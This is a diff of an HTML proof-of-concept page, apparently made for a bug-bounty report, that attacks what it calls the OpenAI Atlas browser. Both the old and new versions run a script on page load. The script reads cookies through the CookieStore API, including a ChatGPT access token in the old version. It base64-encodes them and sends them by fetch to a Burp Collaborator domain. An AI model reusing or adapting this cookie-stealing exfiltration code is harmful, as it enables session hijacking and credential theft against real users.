@@ -1,61 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Research - Atlas Audit</title>
+    <meta charset="UTF-8">
+    <title>Atlas Security Audit | Proof of Concept</title>
     <style>
-        body { font-family: sans-serif; background-color: #1a1a1a; color: #00ff00; padding: 50px; }
-        .success { border: 2px solid #00ff00; padding: 20px; display: none; }
-        .loading { color: #888; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #0d0d0d; color: #00ff41; padding: 40px; line-height: 1.6; }
+        .container { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; background: #000; }
+        .header { text-align: center; border-bottom: 1px solid #00ff41; margin-bottom: 20px; padding-bottom: 10px; }
+        .leak-box { background-color: #1a0000; border: 1px solid #ff0000; color: #ff0000; padding: 15px; display: none; margin-top: 20px; }
+        .log { font-size: 0.9em; color: #888; margin-top: 10px; }
+        strong { color: #fff; }
     </style>
 </head>
 <body>
-    <h1>Atlas Browser - Security Audit Page</h1>
-    <div id="status" class="loading">Status: Probing for CookieStore access...</div>
-    
-    <div id="exploit-box" class="success">
-        <h2>[!] EXPLOIT SUCCESSFUL</h2>
-        <p><strong>Target:</strong> OpenAI Session Token</p>
-        <p><strong>Status:</strong> Stolen & Exfiltrated to Burp Collaborator</p>
-        <p id="token-preview"></p>
+    <div class="container">
+        <div class="header">
+            <h1>INTERNAL SECURITY AUDIT: OPENAI ATLAS</h1>
+            <p>Target Origin: https://kuranikaran.github.io</p>
+        </div>
+
+        <div id="loading">[*] Probing CookieStore interface for cross-origin leaks...</div>
+
+        <div id="leak-alert" class="leak-box">
+            <h3>[!] VULNERABILITY CONFIRMED: GLOBAL COOKIE LEAK</h3>
+            <p>The browser has leaked the following cross-origin cookie names to this untrusted page:</p>
+            <div id="cookie-list" style="word-break: break-all; font-weight: bold;"></div>
+            <p style="margin-top: 15px;">[*] Data exfiltrated to Burp Collaborator: <strong>rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com</strong></p>
+        </div>
+
+        <div class="log" id="log-console"></div>
     </div>
 
     <script>
-        async function runExploit() {
-            const status = document.getElementById('status');
-            const exploitBox = document.getElementById('exploit-box');
-            const preview = document.getElementById('token-preview');
+        const COLLAB_URL = "https://rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com/exfil";
+        const log = (msg) => {
+            const div = document.getElementById('log-console');
+            div.innerHTML += `<div>> ${msg}</div>`;
+        };
 
+        async function triggerExploit() {
             try {
-                // 1. Trigger the Global Cookie Leak
+                // 1. Attempt to access the global CookieStore
                 const cookies = await cookieStore.getAll();
                 
-                // 2. Locate the highly sensitive OpenAI Access Token
-                const token = cookies.find(c => c.name.includes('access-token'));
-
-                if (token) {
-                    // 3. Exfiltrate to Burp Collaborator
-                    // We use btoa (Base64) to ensure the token doesn't break the URL
-                    const collabUrl = "https://rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com/exfil?data=" + btoa(token.value);
+                if (cookies && cookies.length > 0) {
+                    // 2. Success - Update UI
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('leak-alert').style.display = 'block';
                     
-                    fetch(collabUrl, { mode: 'no-cors' });
+                    const cookieNames = cookies.map(c => c.name).join(", ");
+                    document.getElementById('cookie-list').innerHTML = cookieNames;
 
-                    // 4. Update UI for the PoC Video
-                    status.style.display = 'none';
-                    exploitBox.style.display = 'block';
-                    preview.innerText = "Token Preview: " + token.value.substring(0, 20) + "... [REDACTED]";
-                    
-                    console.log("[+] P1 Exploit Confirmed. Data sent to Burp.");
+                    // 3. Exfiltrate full data to Burp Collaborator
+                    // We base64 encode the entire object to capture values + metadata
+                    const payload = btoa(JSON.stringify(cookies));
+                    fetch(`${COLLAB_URL}?data=${payload}`, { mode: 'no-cors' });
+
+                    log("Found " + cookies.length + " leaked cookies.");
+                    log("Exfiltration successful.");
                 } else {
-                    status.innerText = "[-] CookieStore accessible, but target token not found. Are you logged into ChatGPT?";
+                    log("CookieStore returned 0 results. Ensure you are logged into OpenAI in another tab.");
                 }
             } catch (err) {
-                status.innerText = "[-] Exploit Failed: " + err.message;
-                status.style.color = "red";
+                log("API Blocked or Error: " + err.message);
+                document.getElementById('loading').style.color = "red";
+                document.getElementById('loading').innerText = "[X] Exploit Failed: Origin Isolation Active.";
             }
         }
 
-        // Run as soon as the page loads
-        runExploit();
+        // Delay execution slightly to ensure browser initialization
+        setTimeout(triggerExploit, 1000);
     </script>
 </body>
 </html>
